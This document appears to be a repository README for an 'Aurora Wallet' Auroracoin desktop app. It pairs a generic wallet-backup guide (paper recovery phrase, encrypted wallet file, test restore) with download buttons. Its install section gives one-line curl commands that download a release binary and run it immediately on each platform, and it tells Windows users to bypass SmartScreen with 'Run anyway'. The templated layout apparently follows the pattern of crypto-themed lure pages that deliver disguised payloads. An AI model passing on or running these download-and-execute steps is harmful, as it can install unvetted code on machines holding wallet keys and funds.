![Aurora Wallet backup best practice guide](assets/aurora-wallet-guide-article-banner.png)

# Auroracoin wallet backup best practices

The phrase on paper, the wallet file on a drive, and a test restore that proves both work.

## Downloads - 2026.08.1.0

<p align="center"><a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`aurora-wallet-v2026.08.1.0.exe`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`aurora-wallet-v2026.08.1.0.dmg`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`aurora-wallet-v2026.08.1.0.zip`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip) |


A backup you have never restored is a hope, not a backup, and one test restore turns it into one.

Two things need protecting. The recovery phrase restores the keys on any compatible wallet, and the wallet file restores the keys along with the labels, the address book and the transaction metadata. Together they cover a lost laptop, a dead disk and a house move.

<!-- ARTICLE-BODY-BEGIN -->

## Store the phrase properly

Write the words on paper, in order, in your own handwriting. Keep a second copy in a different physical place, such as a safe, a trusted relative or a bank box, and consider stamping the words into metal if fire is a realistic risk where you live.

Never photograph the phrase, never type it into a note app and never email it to yourself. A cloud note is a copy on someone else's disk, and a phone camera roll syncs to the same place.

## Store the wallet file too

1. Close the wallet before copying the file.
2. Copy it to an encrypted USB drive.
3. Label the copy with the date and the version.
4. Recopy after you add addresses or labels.
5. Keep at least one copy away from the computer.

The file is only useful with its password, so keep the password somewhere separate and memorised where possible. A copy of the file beside a written password is one theft away from a loss.

## Test the restore

Install Aurora Wallet on a second machine, or in a fresh user profile, and restore from the phrase. Confirm the addresses match the ones in your current wallet. Remove the test wallet afterwards, and keep the paper copy exactly as it was.

That exercise proves the words are legible, in the right order and correct. It takes ten minutes and it is the only way to know.

## What a backup cannot do

A backup restores keys, not judgement. A phrase shared with a stranger is compromised even if the coins are still there, and <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/35-phishing-seed-scams.md">phishing and seed scams</a> covers what that request looks like.

A backup also does not survive a wrong passphrase. If you set one during setup, record whether you used it, because the same words without it open a different wallet, and <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/25-recovery-phrase-bip39.md">restoring from a phrase</a> walks through the difference.

Keep the application current as well as the backups, since a restore onto the <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest">current Aurora Wallet release</a> is the version that reads current data.

## FAQ

### How often should I redo the backup?

Whenever you add addresses, labels or important history, and at least once a year to confirm the paper is still readable.

### Is a seed phrase enough on its own?

It restores the keys and the balance. The labels and address book live in the wallet file, so keep that too.

<!-- ARTICLE-BODY-END -->

## How to install Aurora Wallet

### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe">aurora-wallet-v2026.08.1.0.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

Check the download: run the command below and compare the result with `f9fdc62a9566b61a1dae689b5aaa1a2df3fcb3e0270a5d2d4bd32e937b924049`.

```cmd
certutil -hashfile setup.exe SHA256
```

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg">aurora-wallet-v2026.08.1.0.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

Check the download: run the command below and compare the result with `2c0fd3f9a9c7ff4df8d10621be1b9284262b4a32109887768c259bc3fb5699f9`.

```bash
shasum -a 256 setup.dmg
```

### Linux
Quick install (Terminal):

```bash
curl -fLo app.zip https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip && unzip -o app.zip && chmod +x aurora-wallet && ./aurora-wallet
```

Manual install:
1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip">aurora-wallet-v2026.08.1.0.zip</a>.
2. Extract the archive.
3. Run `aurora-wallet`.

Check the download: run the command below and compare the result with `fcf7350d8f38256031aa2060bded8898f71cae2cd9613d19fdc0c3e37267717a`.

```bash
sha256sum app.zip
```


## Related guides

- [Recovery phrase and BIP-39](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/25-recovery-phrase-bip39.md)
- [Password encryption](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/34-password-encryption.md)
- [Phishing and seed scams](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/35-phishing-seed-scams.md)
- [Self-custody basics](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/36-self-custody-basics.md)
